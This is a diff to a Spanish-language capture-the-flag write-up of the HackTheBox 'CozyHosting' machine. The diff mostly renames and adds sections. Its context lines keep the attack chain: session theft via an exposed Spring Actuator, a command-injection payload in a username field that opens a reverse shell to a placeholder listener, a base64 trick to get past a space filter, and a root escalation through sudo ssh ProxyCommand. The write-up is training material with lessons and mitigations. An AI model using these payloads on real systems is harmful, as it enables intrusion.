@@ -31,7 +31,11 @@ nmap -p- -sCV <IP> -oN nmap.txt
 
 `/error` devuelve el JSON de Spring y `/actuator` lista `health, beans, env, sessions, mappings`.
 
-## Acceso
+## Enumeración
+
+- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».
+
+## Foothold
 
 ```bash
 curl -s http://cozyhosting.htb/actuator/sessions
@@ -46,7 +50,12 @@ username=;bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1';&host=x
 
 `host` se valida con una regex, el usuario no: ahí está el fallo. Shell como el usuario de la app.
 
-## Escalada
+## Movimiento lateral
+
+- No aplica: la cadena se resuelve en un único host, sin salto lateral.
+- Ver «Escalada de privilegios» para el paso de usuario a administrador.
+
+## Escalada de privilegios
 
 ```bash
 unzip -p /app/cloudhosting-0.0.1.jar BOOT-INF/classes/application.properties
@@ -72,15 +81,27 @@ sudo -l
 sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
 ```
 
-## Tropiezos
+## Evidencia
+
+- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
+- Los valores reales viven en `private/` y no se publican.
+
+## Lecciones aprendidas
 
 - **Cookie de sesión**: sin la sesión de un admin, `/admin` redirige al login.
 - **Payload con espacios**: el campo no admite espacios en claro; codificar en base64 (`echo <b64>|base64 -d|bash`).
 - **`sudo ssh`**: sin `-o ProxyCommand` la escalada no funciona; es el ejemplo clásico de GTFOBins.
 
-## Lecciones
-
 - Un Actuator expuesto publica sesiones, variables de entorno y beans: es un panel de administración sin contraseña.
 - Validar un campo y olvidar el de al lado es un patrón habitual.
 - Credenciales en `application.properties` dentro del `.jar` están en claro.
 - `sudo` sobre `ssh` equivale a root.
+
+## Mitigaciones y detección
+
+- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.
+- Consultas parametrizadas y permisos mínimos para la cuenta de base de datos.
+
+## Referencias
+
+- [rop-stack](../../../knowledge/pwn/rop-stack.md)
